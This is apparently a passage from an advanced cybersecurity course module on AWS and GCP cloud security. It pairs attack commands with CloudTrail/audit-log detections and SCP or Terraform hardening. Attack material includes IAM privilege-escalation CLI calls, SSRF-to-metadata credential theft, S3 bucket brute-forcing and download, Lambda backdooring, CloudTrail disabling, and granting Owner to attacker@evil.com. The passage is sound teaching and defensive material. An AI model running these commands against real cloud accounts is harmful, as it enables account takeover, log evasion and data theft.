---
corso: "Cybersecurity Masterclass"
fase: "Domain 10 — Cloud Security"
modulo: "10.1"
titolo: "Cloud Provider Security: AWS, GCP, and Azure"
versione: "AWS IAM 2025, GCP IAM 2025, Azure Entra ID 2024, ATT&CK v16+"
livello: "Advanced"
prerequisiti:
  - "Linux/Windows administration fundamentals"
  - "Networking (TCP/IP, DNS, HTTP/TLS)"
  - "IAM concepts (roles, policies, federation)"
  - "SSRF and web application vulnerability basics (Domain 8)"
  - "SIEM and log analysis fundamentals (Domain 7)"
obiettivi:
  - "Enumerate and exploit IAM privilege-escalation paths across AWS, GCP, and Azure"
  - "Demonstrate IMDS credential theft via SSRF on all three providers and apply provider-specific mitigations"
  - "Detect and respond to Golden SAML and OIDC trust abuse in federated cloud environments"
  - "Author Sigma detection rules for CloudTrail, Cloud Audit Logs, and Azure Activity Log events"
  - "Assess cloud posture using ScoutSuite, Prowler, and CloudFox against CIS benchmarks"
tag: [cloud-security, aws, gcp, azure, iam, imds, ssrf, golden-saml, cloudtrail, sigma, cspm, mitre-attack]
---

# Domain 10, Chapter 10A — Cloud Provider Security: AWS, GCP, and Azure

> **Learning objectives.** After completing this chapter, you will be able to: (1) map AWS IAM privilege-escalation chains and write SCPs to constrain them; (2) exploit and defend IMDS endpoints across AWS IMDSv1/v2, GCP metadata server, and Azure IMDS; (3) identify and harden S3, GCS, and Azure Blob misconfigurations that enable data exfiltration; (4) detect identity federation attacks (Golden SAML, OIDC abuse) using cross-provider log correlation; (5) deploy cloud-native and open-source CSPM tooling to continuously audit multi-cloud environments.

> **Scope.** AWS: IAM role trust/AssumeRole/PassRole, IMDSv1/v2, S3 policy evaluation, Lambda security, CloudTrail gaps, SCPs, EKS, VPC, confused deputy, Route53 hijacking, ECR, KMS. GCP: IAM roles, service account key generation, metadata server, Cloud Functions/Run, BigQuery, GKE/Workload Identity, GCS, Cloud KMS, organization policies, Firebase. Azure: Azure AD tenants/service principals/managed identities, ARM RBAC, IMDS, Functions, Key Vault, Blob Storage/SAS, AKS, DevOps pipeline injection, Conditional Access bypass, App Service SCM/KUDU.

---

## 1. AWS security

### 1.1 IAM and role assumption

AWS IAM is the central authorization system. Every API call is authenticated (via access key, STS token, or instance profile) and authorized against IAM policies attached to the calling principal.

**Role trust policies.** An IAM role has two policy types: the trust policy (who can assume the role) and the permissions policy (what the role can do). The trust policy is a JSON document specifying which principals (`arn:aws:iam::ACCOUNT:root`, specific users, services, or federated identities) are allowed to call `sts:AssumeRole`. A misconfigured trust policy (e.g., `"Principal": "*"`) allows any AWS account to assume the role.

**`sts:AssumeRole` chains.** Role A assumes Role B, which assumes Role C — creating transitive access chains. An attacker who compromises any link in the chain gains the permissions of the final role. Auditing these chains requires mapping the trust-policy graph across all roles in all accounts.

**Exploitation — enumerating assumable roles:**

```bash
# List all roles in the account
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Inspect trust policy for a specific role
aws iam get-role --role-name TargetRole --query 'Role.AssumeRolePolicyDocument'

# Attempt to assume a role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/TargetRole \
  --role-session-name attacker-session

# Chain: assume role B using credentials from role A
export AWS_ACCESS_KEY_ID=<from-role-A>
export AWS_SECRET_ACCESS_KEY=<from-role-A>
export AWS_SESSION_TOKEN=<from-role-A>
aws sts assume-role --role-arn arn:aws:iam::999888777666:role/RoleC \
  --role-session-name chain-session
```

**`iam:PassRole`.** When creating a resource that runs with an IAM role (EC2 instance, Lambda function, ECS task), the creating principal must have `iam:PassRole` permission for the target role. Without this check, a low-privilege user could create a Lambda function with an admin role and execute code as admin. Misconfigured `iam:PassRole` (allowing `Resource: "*"`) enables this privilege escalation.

#### 1.1.1 IAM privilege escalation paths

Rhino Security Labs documented 21+ distinct IAM privilege-escalation vectors. Each abuses a specific IAM permission (or combination) to gain higher privileges. Key paths:

**iam:CreatePolicyVersion.** A principal with this permission can create a new version of any customer-managed policy and set it as the default version. The new version can grant `*:*` (full admin). The principal doesn't need permission to attach the policy — they modify one already attached to themselves or another principal.

```bash
# Create a new policy version granting admin access
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/SomePolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**iam:AttachUserPolicy / iam:AttachGroupPolicy / iam:AttachRolePolicy.** Allows attaching any managed policy (including `arn:aws:iam::aws:policy/AdministratorAccess`) to the attacker's user, group, or role.

```bash
aws iam attach-user-policy \
  --user-name attacker-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**iam:PutUserPolicy / iam:PutGroupPolicy / iam:PutRolePolicy.** Similar to attach, but creates inline policies directly on the principal. The attacker writes their own policy document.

**iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction.** The attacker creates a Lambda function that runs with a high-privilege role (PassRole), writes code that exercises those privileges (e.g., creates an admin user), and invokes the function.

```bash
# Create a Lambda function with an admin execution role
aws lambda create-function \
  --function-name privesc-func \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://payload.zip

# Invoke it
aws lambda invoke --function-name privesc-func /dev/stdout
```

**iam:PassRole + ec2:RunInstances.** Launch an EC2 instance with an admin instance profile, SSH in, and use the instance's IAM credentials from IMDS.

```bash
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --key-name attacker-key
```

**sts:AssumeRole with cross-account trust.** If any role's trust policy specifies `"Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"}`, the attacker's entire account can assume that role. Auditing: enumerate all role trust policies across all accounts, flag any that trust external accounts.

**iam:CreateLoginProfile / iam:UpdateLoginProfile.** Create or change the console password for another IAM user, enabling console access as that user.

**iam:CreateAccessKey.** Generate a new access key for another IAM user, providing programmatic access as that user.

**iam:SetDefaultPolicyVersion.** Switch the active version of a policy to a more permissive historical version that was previously superseded.

**Detection — CloudTrail indicators for IAM escalation:**

```sql
-- CloudTrail Lake: detect privilege escalation attempts
SELECT eventTime, userIdentity.arn, eventName, requestParameters
FROM <EVENT_DATA_STORE_ID>
WHERE eventName IN (
  'CreatePolicyVersion', 'AttachUserPolicy', 'AttachRolePolicy',
  'AttachGroupPolicy', 'PutUserPolicy', 'PutRolePolicy', 'PutGroupPolicy',
  'CreateRole', 'UpdateAssumeRolePolicy', 'CreateLoginProfile',
  'UpdateLoginProfile', 'CreateAccessKey'
)
AND eventTime > '2025-01-01'
ORDER BY eventTime DESC
```

**Hardening — SCP restricting dangerous IAM actions in member accounts:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyIAMEscalation",
      "Effect": "Deny",
      "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion",
        "iam:AttachUserPolicy",
        "iam:AttachRolePolicy",
        "iam:AttachGroupPolicy",
        "iam:PutUserPolicy",
        "iam:PutRolePolicy",
        "iam:PutGroupPolicy",
        "iam:CreateUser",
        "iam:CreateLoginProfile",
        "iam:UpdateLoginProfile",
        "iam:CreateAccessKey"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:role/ApprovedAdminRole"
        }
      }
    }
  ]
}
```

**Real-world.** Pacu (the AWS exploitation framework by Rhino Security) automates these paths via its `iam__privesc_scan` module, which enumerates the caller's permissions and identifies exploitable escalation vectors.

```bash
# Pacu: enumerate and exploit IAM privesc
pacu
> import_keys attacker
> run iam__privesc_scan
> run iam__enum_permissions
```

### 1.2 Instance Metadata Service (IMDS)

EC2 instances access their IAM credentials via the metadata service at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`.

**IMDSv1**: a simple GET request returns credentials. Any code running on the instance (including SSRF-exploited web applications) can reach it. This is the single most exploited cloud attack path: SSRF -> IMDS -> credential theft -> account compromise.

**IMDSv2**: requires a PUT request with a TTL header to obtain a session token (`X-aws-ec2-metadata-token-ttl-seconds`), then includes the token in subsequent GET requests (`X-aws-ec2-metadata-token`). SSRF vulnerabilities that only allow GET requests or cannot set custom headers cannot reach IMDSv2.

**Hop-limit bypass.** IMDSv2's token PUT request has a default IP TTL of 1 (the response is only valid for the same host, not forwarded). Docker containers on the EC2 instance are one hop away (TTL decremented to 0), so they cannot receive the token. However, `--network=host` containers share the host's network stack (same hop count), bypassing this restriction.

**Exploitation — SSRF to IMDS credential theft (v1):**

```bash
# Step 1: Discover the role name via SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Retrieve temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-WebAppRole
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# Step 3: Use stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
# Confirms identity as the EC2 instance's role
```

**Exploitation — bypassing IMDSv2 in misconfigured setups:**

```bash
# If hop limit is set too high (e.g., 2+), containers can reach IMDS
# Step 1: Get token via PUT
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token to fetch credentials
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Detection — CloudTrail events for IMDS credential use outside the instance:**

When IMDS-sourced credentials are used from an IP address different from the instance's private/public IP, this indicates stolen credentials. CloudTrail records the source IP on every API call.

```sql
-- CloudTrail Lake: detect IMDS credentials used from unexpected IPs
SELECT eventTime, eventName, sourceIPAddress, userIdentity.arn,
       userIdentity.sessionContext.sessionIssuer.arn AS roleArn
FROM <EVENT_DATA_STORE_ID>
WHERE userIdentity.type = 'AssumedRole'
AND sourceIPAddress NOT IN ('10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16')
AND userIdentity.sessionContext.sessionIssuer.arn LIKE '%:role/EC2-%'
ORDER BY eventTime DESC
```

Also monitor `GetMetadataToken` events (IMDSv2 token requests logged to instance-level logs via EC2 serial console or CloudWatch agent).

**Hardening — Terraform enforcing IMDSv2:**

```hcl
resource "aws_instance" "web" {
  ami           = "ami-0abcdef1234567890"
  instance_type = "t3.micro"

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"  # Enforces IMDSv2
    http_put_response_hop_limit = 1           # Prevents container escape
    instance_metadata_tags      = "disabled"
  }
}
```

**SCP enforcing IMDSv2 across all accounts:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "RequireIMDSv2",
      "Effect": "Deny",
      "Action": "ec2:RunInstances",
      "Resource": "arn:aws:ec2:*:*:instance/*",
      "Condition": {
        "StringNotEquals": {
          "ec2:MetadataHttpTokens": "required"
        }
      }
    }
  ]
}
```

**Real-world — Capital One breach (2019).** An SSRF vulnerability in a WAF misconfiguration on an EC2 instance allowed an attacker to query the IMDSv1 endpoint, steal IAM role credentials, and exfiltrate 100M+ credit applications from S3. This incident was the catalyst for AWS developing and promoting IMDSv2.

### 1.3 S3 security

S3 access is governed by the intersection/union of bucket policies, IAM policies, ACLs, and S3 access points. The evaluation logic: an explicit Deny in any policy takes precedence; otherwise, an Allow in any applicable policy grants access.

**Public bucket enumeration.** Misconfigured bucket policies (allowing `s3:GetObject` to `Principal: "*"`) or ACLs (granting `READ` to the `AllUsers` or `AuthenticatedUsers` group) expose bucket contents publicly. Tools enumerate S3 buckets by brute-forcing bucket names (bucket names are globally unique and often predictable: `companyname-backup`, `companyname-dev`).

**`s3:PutObject` ACL grants.** When a user uploads an object with `x-amz-acl: bucket-owner-full-control`, the bucket owner gets full control. But if the uploader doesn't include this header, they retain ownership of the object even in the bucket owner's bucket — a source of access-control confusion in cross-account S3 usage.

**Exploitation — S3 bucket enumeration and data exfiltration:**

```bash
# Brute-force bucket names
for name in companyname-{backup,dev,staging,prod,logs,data,assets}; do
  aws s3 ls s3://$name --no-sign-request 2>/dev/null && echo "PUBLIC: $name"
done

# Account ID enumeration via S3 bucket policies (s3:ResourceAccount condition key)
# If a bucket policy uses s3:ResourceAccount, the error message may leak the account ID

# List public bucket contents
aws s3 ls s3://target-bucket --no-sign-request --recursive

# Download all objects from a public bucket
aws s3 sync s3://target-bucket ./exfil --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
```

**EBS snapshot exposure.** Public EBS snapshots can be discovered and mounted by any AWS account. Snapshots may contain database files, credentials, private keys.

```bash
# List public snapshots owned by a target account
aws ec2 describe-snapshots --owner-ids 123456789012 \
  --filters Name=status,Values=completed \
  --query 'Snapshots[*].[SnapshotId,Description,VolumeSize]'

# Create a volume from a public snapshot and mount it
aws ec2 create-volume --snapshot-id snap-0abc123 \
  --availability-zone us-east-1a --volume-type gp3
# Attach to attacker's instance, mount, and extract data
```

**ECR image poisoning.** If an ECR repository has a permissive resource-based policy, an attacker can push a backdoored container image. When legitimate workloads pull the image, they execute the attacker's code.

```bash
# Check ECR repository policy
aws ecr get-repository-policy --repository-name target-repo

# If cross-account pull is allowed, pull and inspect
aws ecr get-login-password --region us-east-1 | \
  docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com
docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/target-repo:latest
```

**Detection — S3 data exfiltration via CloudTrail S3 data events:**

```sql
-- CloudTrail Lake: detect bulk S3 downloads
SELECT eventTime, userIdentity.arn, requestParameters.bucketName,
       requestParameters.key, sourceIPAddress
FROM <EVENT_DATA_STORE_ID>
WHERE eventSource = 's3.amazonaws.com'
AND eventName = 'GetObject'
AND eventTime > '2025-01-01'
GROUP BY userIdentity.arn, requestParameters.bucketName
HAVING count(*) > 1000
ORDER BY count(*) DESC
```

**Hardening — S3 block public access (Terraform):**

```hcl
resource "aws_s3_account_public_access_block" "block" {
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket" "data" {
  bucket = "company-data-prod"
}

resource "aws_s3_bucket_versioning" "data" {
  bucket = aws_s3_bucket.data.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.s3_key.arn
    }
    bucket_key_enabled = true
  }
}
```

### 1.4 Lambda security

**Event injection.** Lambda functions are triggered by event sources (S3 notifications, SQS messages, DynamoDB streams, API Gateway). If the event source is not properly validated, an attacker can inject malicious events (e.g., uploading a specially-named file to an S3 bucket that triggers a Lambda, passing the filename as input to a command-injection-vulnerable handler).

**Container reuse.** Lambda reuses execution environments across invocations. Files written to `/tmp` persist across invocations in the same container. An attacker who compromises one invocation can leave artifacts in `/tmp` that affect subsequent invocations — a persistence mechanism within the Lambda's lifecycle.

**Execution role abuse.** `lambda:UpdateFunctionCode` and `lambda:UpdateFunctionConfiguration` allow modifying a function's code or environment. An attacker with these permissions can backdoor a Lambda function (inject malicious code) and the function's execution role runs the attacker's code.

**Layer poisoning.** Lambda Layers are shared code packages. If `lambda:PublishLayerVersion` is available, an attacker can publish a new version of a layer with backdoored code. All functions using that layer (without pinning a specific version) will load the malicious code on next cold start.

```bash
# List Lambda functions and their execution roles
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Role,Runtime]' --output table

# Get function policy (resource-based policy)
aws lambda get-policy --function-name target-function

# Update function code with backdoored payload
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://backdoor.zip

# Inject via environment variables (e.g., LD_PRELOAD or PATH hijack)
aws lambda update-function-configuration \
  --function-name target-function \
  --environment '{"Variables":{"LD_PRELOAD":"/tmp/malicious.so"}}'
```

**Cold start timing.** Lambda cold starts have higher latency. An attacker can fingerprint whether a function is experiencing a cold start by measuring response times, potentially inferring invocation patterns and usage.

**Detection — Lambda abuse via CloudTrail:**

```sql
-- Detect Lambda code/config modifications
SELECT eventTime, userIdentity.arn, eventName,
       requestParameters.functionName, sourceIPAddress
FROM <EVENT_DATA_STORE_ID>
WHERE eventName IN (
  'UpdateFunctionCode20150331v2', 'UpdateFunctionConfiguration20150331v2',
  'PublishLayerVersion', 'AddPermission20150331v2'
)
ORDER BY eventTime DESC
```

**Hardening — least-privilege Lambda execution role:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:*:log-group:/aws/lambda/my-function:*"
    },
    {
      "Effect": "Allow",
      "Action": ["dynamodb:GetItem", "dynamodb:PutItem"],
      "Resource": "arn:aws:dynamodb:us-east-1:123456789012:table/MyTable"
    }
  ]
}
```

### 1.5 STS token abuse

AWS STS issues temporary credentials via multiple mechanisms. Each produces tokens with different lifetimes and permissions.

**GetSessionToken.** Returns temporary credentials for an IAM user. Used for MFA-protected API access. The resulting credentials cannot call IAM or STS APIs (except `AssumeRole`), reducing their utility for escalation but still enabling data access.

**GetFederationToken.** Returns temporary credentials scoped by an inline policy. Commonly used for federated users who need temporary AWS access without an IAM user. The resulting credentials have an intersection of the calling IAM user's permissions and the federation policy.

**AssumeRoleWithWebIdentity.** Exchanges an OIDC token (e.g., from Cognito, Google, or any OIDC provider) for AWS STS credentials. If the role's trust policy doesn't restrict the `aud` (audience) or `sub` (subject) claims, any valid token from the trusted OIDC provider grants access.

```bash
# AssumeRoleWithWebIdentity — exchange OIDC token for AWS credentials
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789012:role/WebIdRole \
  --role-session-name web-session \
  --web-identity-token file://oidc_token.txt

# GetSessionToken with MFA
aws sts get-session-token \
  --serial-number arn:aws:iam::123456789012:mfa/user \
  --token-code 123456
```

**Detection:** Monitor `sts:AssumeRoleWithWebIdentity` and `sts:AssumeRoleWithSAML` calls for unexpected OIDC provider ARNs or SAML provider ARNs in CloudTrail.

### 1.6 CloudTrail and logging

CloudTrail logs API calls. Gaps: some data-plane events (S3 object-level operations, Lambda invocations) require explicit configuration to log. An attacker with `cloudtrail:StopLogging` or `cloudtrail:DeleteTrail` can disable logging — but this action itself is logged (unless the trail was already stopped). `cloudtrail:PutEventSelectors` can selectively exclude event types.

**CloudTrail evasion techniques:**

- **Non-logging services.** Certain API actions are not logged by CloudTrail even with management events enabled. Some read-only actions on newer services may not generate events. The attacker can operate within these blind spots.
- **Data events not enabled.** By default, CloudTrail only logs management events. S3 object-level operations (GetObject, PutObject) and Lambda invocations require data events to be explicitly enabled — most accounts don't enable these, creating large blind spots.
- **Read-only evasion.** If the trail is configured to log only WriteOnly management events, all read operations (listing resources, describing configurations, downloading S3 objects without data events) are invisible.
- **Trail deletion race.** An attacker with `cloudtrail:DeleteTrail` can delete the trail, perform actions, and recreate it. The deletion event is logged, but subsequent actions are not.

```bash
# Attacker: stop logging (this action IS logged)
aws cloudtrail stop-logging --name default-trail

# Attacker: delete trail
aws cloudtrail delete-trail --name default-trail

# Attacker: modify event selectors to exclude S3 data events
aws cloudtrail put-event-selectors --trail-name default-trail \
  --event-selectors '[{"ReadWriteType":"WriteOnly","IncludeManagementEvents":true}]'
```

**Defense — Organization trail and immutable logging:**

```bash
# Create organization trail (covers all member accounts, immutable by members)
aws cloudtrail create-trail \
  --name org-trail \
  --s3-bucket-name org-cloudtrail-logs \
  --is-organization-trail \
  --is-multi-region-trail \
  --enable-log-file-validation \
  --kms-key-id arn:aws:kms:us-east-1:MGMT_ACCOUNT:key/KEY_ID

aws cloudtrail start-logging --name org-trail

# Enable S3 data events for all buckets
aws cloudtrail put-event-selectors --trail-name org-trail \
  --event-selectors '[{
    "ReadWriteType":"All",
    "IncludeManagementEvents":true,
    "DataResources":[{"Type":"AWS::S3::Object","Values":["arn:aws:s3:::"]}]
  }]'
```

**S3 Object Lock for log integrity:** Enable Object Lock with Governance or Compliance mode on the CloudTrail S3 bucket to prevent deletion or overwrite of log files, even by the root account (in Compliance mode).

**Detection — alert on CloudTrail tampering:**

```sql
-- CloudTrail Lake: detect logging tampering
SELECT eventTime, userIdentity.arn, eventName, sourceIPAddress
FROM <EVENT_DATA_STORE_ID>
WHERE eventName IN (
  'StopLogging', 'DeleteTrail', 'UpdateTrail',
  'PutEventSelectors', 'DeleteEventDataStore'
)
ORDER BY eventTime DESC
```

### 1.7 SCPs and Organizations

Service Control Policies (SCPs) in AWS Organizations restrict permissions for all principals in member accounts. SCPs are Deny-based: they create a permission boundary that IAM policies cannot exceed. Even an account's root user is constrained by SCPs.

**Bypass considerations.** SCPs don't apply to the management account (the Organizations root). `sts:SetSourceIdentity` can be used to tag assumed-role sessions; if SCPs filter on source identity conditions, the interaction between STS session tags and SCP conditions can create unexpected allow/deny outcomes.

**SCP — deny region usage (restrict blast radius):**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyUnusedRegions",
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:RequestedRegion": ["us-east-1", "eu-west-1"]
        },
        "ArnNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:role/OrganizationAccountAccessRole"
        }
      }
    }
  ]
}
```

**SCP — prevent member accounts from leaving the organization:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyLeaveOrg",
      "Effect": "Deny",
      "Action": "organizations:LeaveOrganization",
      "Resource": "*"
    }
  ]
}
```

### 1.8 EKS, VPC, and network-layer services

**EKS.** The `aws-auth` ConfigMap in the `kube-system` namespace maps AWS IAM roles/users to Kubernetes RBAC groups. Adding an IAM role mapping to `system:masters` grants cluster-admin. If an attacker gains `eks:UpdateClusterConfig` or direct access to the ConfigMap (via a compromised pod), they can escalate to cluster admin. **IRSA (IAM Roles for Service Accounts)** provides fine-grained IAM permissions for Kubernetes pods; **Pod Identity** is the newer replacement.

**VPC.** Security groups are stateful (return traffic is automatically allowed); NACLs are stateless (require explicit rules for both directions). VPC peering and Transit Gateway enable lateral movement between VPCs — a compromised workload in one VPC can reach services in peered VPCs. `aws:SourceVpc` and `aws:SourceArn` conditions in IAM policies are intended to prevent confused-deputy attacks but can be bypassed if the attacker can make API calls from within the trusted VPC or can forge the source ARN context.

**Route53 subdomain takeover.** A DNS record (CNAME, A/Alias) points to a resource (S3 bucket, CloudFront distribution, Elastic Beanstalk) that has been deleted. The attacker creates a new resource with the same name and takes over the subdomain. Detection: periodically resolve all CNAME records and verify the target exists. Tools like `subjack` and `can-i-take-over-xyz` automate this.

```bash
# Enumerate dangling DNS records pointing to deleted resources
aws route53 list-resource-record-sets --hosted-zone-id Z0123456789 \
  --query 'ResourceRecordSets[?Type==`CNAME`].[Name,ResourceRecords[0].Value]'
```

**KMS key policy abuse.** If a KMS key policy grants `kms:*` to a broad principal, the attacker can encrypt data with the key (ransomware scenario), disable key rotation, or schedule key deletion (data destruction).

---

## 2. GCP security

### 2.1 IAM and service accounts

GCP IAM uses primitive roles (`Owner`, `Editor`, `Viewer` — overly broad), predefined roles (fine-grained, per-service), and custom roles. Service accounts are the GCP identity for workloads.

**`iam.serviceAccounts.getAccessToken`.** A principal with this permission on a service account can generate an access token for that service account — effectively impersonating it. This is the GCP equivalent of AWS's `sts:AssumeRole`. If a low-privilege service account has `getAccessToken` on a high-privilege service account, it can escalate.

**Service account key generation.** `iam.serviceAccountKeys.create` allows creating a long-lived private key for a service account. This key provides permanent access without MFA or session expiration. Detecting key creation and auditing for service accounts with external keys is critical.

**Exploitation — service account impersonation and key generation:**

```bash
# List all service accounts in a project
gcloud iam service-accounts list --project=target-project

# Generate an access token for a service account (requires getAccessToken permission)
gcloud auth print-access-token --impersonate-service-account=sa@target-project.iam.gserviceaccount.com

# Create a persistent key for a service account
gcloud iam service-accounts keys create key.json \
  --iam-account=sa@target-project.iam.gserviceaccount.com

# Use the key
gcloud auth activate-service-account --key-file=key.json
gcloud projects list  # now operating as the service account
```

**IAM policy binding escalation — setIamPolicy.** A principal with `setIamPolicy` on a resource (project, folder, organization) can modify IAM bindings on that resource. This is the most powerful permission in GCP — it allows granting any role to any principal.

```bash
# Grant Owner role to attacker's account
gcloud projects add-iam-policy-binding target-project \
  --member="user:attacker@evil.com" \
  --role="roles/owner"

# Grant a service account impersonation permission
gcloud iam service-accounts add-iam-policy-binding \
  sa@target-project.iam.gserviceaccount.com \
  --member="user:attacker@evil.com" \
  --role="roles/iam.serviceAccountTokenCreator"
```

**Detection — GCP Cloud Audit Logs for IAM changes:**

```
# GCP log filter for IAM policy modifications
resource.type="project"
protoPayload.methodName="SetIamPolicy"
protoPayload.authenticationInfo.principalEmail!="expected-admin@company.com"

# Detect service account key creation
resource.type="service_account"
protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"
```

**Hardening — Organization Policy constraints:**

```bash
# Disable service account key creation across the org
gcloud org-policies set-policy --organization=ORG_ID policy.yaml
```

Where `policy.yaml`:

```yaml
constraint: constraints/iam.disableServiceAccountKeyCreation
booleanPolicy:
  enforced: true
```

```bash
# Restrict allowed external IAM members
gcloud org-policies set-policy --organization=ORG_ID domain-policy.yaml
```

Where `domain-policy.yaml`:

```yaml
constraint: constraints/iam.allowedPolicyMemberDomains
listPolicy:
  allowedValues:
    - "C0abcdef"  # GCP customer ID for company.com
```

### 2.2 Metadata server exploitation

GCP Compute Engine instances expose metadata at `http://metadata.google.internal/computeMetadata/v1/` (equivalent: `http://169.254.169.254/computeMetadata/v1/`). GCP requires the `Metadata-Flavor: Google` header on all requests — SSRF that can set custom headers still reaches it.

**Exploitation:**

```bash
# Retrieve access token for the instance's service account
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Retrieve service account email
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Retrieve project-level metadata (may contain startup scripts with secrets)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"

# Retrieve instance SSH keys (custom metadata)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys"
```

**Default service account problem.** By default, Compute Engine instances use the project's default service account with `Editor` scope — effectively project-level admin. Any SSRF or RCE on such an instance yields near-full project access.

**Hardening:** Assign dedicated least-privilege service accounts per workload. Disable the default Compute Engine service account. Use Workload Identity for GKE.

### 2.3 GKE and Workload Identity

**`kube-env` metadata.** On older GKE configurations, the node's metadata server exposes `kube-env`, which contains the kubelet's bootstrap token — a credential sufficient to authenticate to the Kubernetes API server with the node's permissions. The GKE metadata concealment proxy (and Workload Identity) mitigate this by blocking metadata access from pods and instead providing per-pod identity tokens.

**Workload Identity** maps Kubernetes service accounts to GCP service accounts, allowing pods to authenticate to GCP APIs with fine-grained IAM permissions without node-level service account exposure.

**GKE node service account over-permissioning.** If GKE nodes use a service account with broad permissions (e.g., `Editor`), any pod that can reach the metadata server (without Workload Identity) inherits those permissions. Container escape -> metadata server -> project compromise.

```bash
# Check GKE node pool service account
gcloud container node-pools describe default-pool \
  --cluster=my-cluster --zone=us-central1-a \
  --format='value(config.serviceAccount)'

# If it shows "default", the default Compute Engine SA is used (dangerous)
```

**Cloud Shell abuse.** GCP Cloud Shell runs a VM with the user's credentials. If an attacker can convince a user to run a command in Cloud Shell (via social engineering or a crafted link), the command executes with the user's full permissions. The `cloudshell.googleapis.com/authorize` URL can be weaponized.

### 2.4 Cloud Functions and Cloud Run

**Cloud Function event injection.** Similar to AWS Lambda — functions triggered by Pub/Sub, Cloud Storage, or HTTP can receive attacker-controlled input. Functions with broad IAM permissions running in default service accounts create escalation paths.

```bash
# List Cloud Functions and their service accounts
gcloud functions list --format='table(name,runtime,serviceAccountEmail)'

# Deploy a backdoored function (if deployer permissions are available)
gcloud functions deploy backdoor-func \
  --runtime=python312 \
  --trigger-http \
  --entry-point=handler \
  --source=./malicious-source \
  --service-account=high-priv-sa@project.iam.gserviceaccount.com
```

**Cloud Run — container image source.** Cloud Run pulls images from Artifact Registry or Container Registry. If the registry permissions are lax, image substitution is possible. Use Binary Authorization to enforce that only signed, trusted images are deployed.

### 2.5 Firebase

**Misconfigured Realtime Database rules.** Firebase Realtime Database uses JSON-based security rules. A common misconfiguration: `{".read": true, ".write": true}` at the root — allowing any authenticated (or even unauthenticated) user to read and write all data. **Firestore** has similar rule-language risks. Firebase Auth session tokens (JWTs) issued by Firebase can be long-lived; stolen tokens provide persistent access.

**Exploitation — probing Firebase databases:**

```bash
# Check if a Firebase database is publicly readable
curl https://TARGET-PROJECT.firebaseio.com/.json

# If rules allow unauthenticated read, this returns all data
# Write test (if .write is true)
curl -X PUT -d '{"test":"pwned"}' \
  https://TARGET-PROJECT.firebaseio.com/test.json
```

### 2.6 Organization policies and API enablement

GCP Organization Policies (`constraints/`) restrict resource configuration across the organization. `constraints/iam.allowedPolicyMemberDomains` restricts which domains can be granted IAM roles. `inheritFromParent` controls whether child folders/projects inherit the constraint. Bypass: if a project is moved to a folder without the constraint (or if `inheritFromParent` is false on a child), the constraint doesn't apply.

`serviceusage.services.enable` allows enabling GCP APIs (services) in a project. An attacker who can enable APIs can activate services (Compute Engine, Cloud Functions) that weren't previously available, expanding their attack surface.

**Key organization constraints for hardening:**

```bash
# Disable VM serial port access (prevents console-based data exfil)
